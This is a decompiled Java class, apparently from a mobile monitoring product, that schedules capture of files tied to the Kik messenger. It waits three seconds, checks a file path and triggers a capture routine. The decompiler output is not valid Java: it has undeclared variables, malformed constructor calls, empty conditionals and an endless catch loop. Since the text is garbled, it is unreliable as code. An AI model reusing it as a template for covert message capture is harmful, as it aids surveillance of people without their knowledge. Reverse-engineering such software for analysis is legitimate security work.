package com.vvt.capture.kik.a;

import android.os.SystemClock;
import com.vvt.base.capture.i;
import java.io.File;

class d
  implements Runnable
{
  d(c paramc) {}
  
  public void run()
  {
    bool = b.a();
    if (bool) {}
    long l = 3000L;
    SystemClock.sleep(l);
    try
    {
      localObject1 = this.a;
      File localFile = new java/io/File;
      Object localObject3 = this.a;
      localObject3 = c.a((c)localObject3);
      localFile.<init>((String)localObject3);
      c.a((c)localObject1, localFile);
      localObject1 = this.a;
      localObject1 = ((c)localObject1).a;
      bool = b.a((b)localObject1);
      if (bool)
      {
        localObject1 = this.a;
        localObject1 = c.b((c)localObject1);
        bool = ((File)localObject1).exists();
        if (bool)
        {
          bool = b.a();
          if (bool) {}
          localObject1 = this.a;
          localObject1 = ((c)localObject1).a;
          localObject1 = b.b((b)localObject1);
          ((i)localObject1).a();
        }
      }
      localObject1 = this.a;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        bool = b.c();
        if (bool) {}
        c localc = this.a;
      }
    }
    finally
    {
      c.a(this.a, null);
    }
    c.a((c)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/kik/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */